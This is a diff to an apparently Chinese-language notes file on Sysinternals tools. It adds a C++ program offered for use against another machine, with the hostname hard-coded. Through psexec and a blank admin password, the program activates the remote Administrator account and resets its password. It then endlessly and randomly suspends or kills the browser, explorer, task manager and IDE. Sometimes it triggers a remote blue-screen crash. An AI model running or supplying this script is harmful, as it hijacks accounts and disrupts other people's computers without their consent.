@@ -46,3 +46,70 @@ notmyfaultc crash 0x01 #瞬间蓝屏（自己的电脑）
 ```
 
 pssuspend配合while(true)与sleep效果奇佳。
+
+## 一段振奋人心的代码
+
+请在sysinternals suite里面执行。方便起见，我把主机名写死在代码里了。
+
+```cpp
+#include <cstdlib>
+#include <iostream>
+#include <cstdio>
+#include <ctime>
+#include <windows.h>
+
+using namespace std;
+
+int main(){
+	srand(time(NULL));
+	system("psexec \\\\xxx -accepteula -u admin -p \"\" -s net user Administrator /active:yes");
+	system("psexec \\\\xxx -accepteula -u admin -p \"\" -s net user Administrator happy");
+	while(1){
+		Sleep(500);
+		switch(rand()%13){
+			case 0:
+				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" chrome");
+				break;
+			case 1:
+				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" devcpp");
+				break;
+			case 2:
+				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" explorer");
+				break;
+			case 3:
+				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" taskmgr");
+				break;
+			case 4:
+				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" chrome -r");
+				break;
+			case 5:
+				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" devcpp -r");
+				break;
+			case 6:
+				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" explorer -r");
+				break;
+			case 7:
+				system("pssuspend \\\\xxx -accepteula -u Administrator -p \"happy\" taskmgr -r");
+				break;
+			case 8:
+				system("pskill \\\\xxx -accepteula -u Administrator -p \"happy\" chrome");
+				break;
+			case 9:
+				system("pskill \\\\xxx -accepteula -u Administrator -p \"happy\" devcpp");
+				break;
+			case 10:
+				system("pskill \\\\xxx -accepteula -u Administrator -p \"happy\" explorer");
+				break;
+			case 11:
+				system("pskill \\\\xxx -accepteula -u Administrator -p \"happy\" taskmgr");
+				break;
+			case 12:
+				int p = rand()%100;
+				if(p==0){
+					system("pskill \\\\xxx -u Administrator -p \"happy\" -c -d -s notmyfaultc.exe crash 0x01 -accepteula");
+				}
+				break;
+		}
+	}
+}
+```
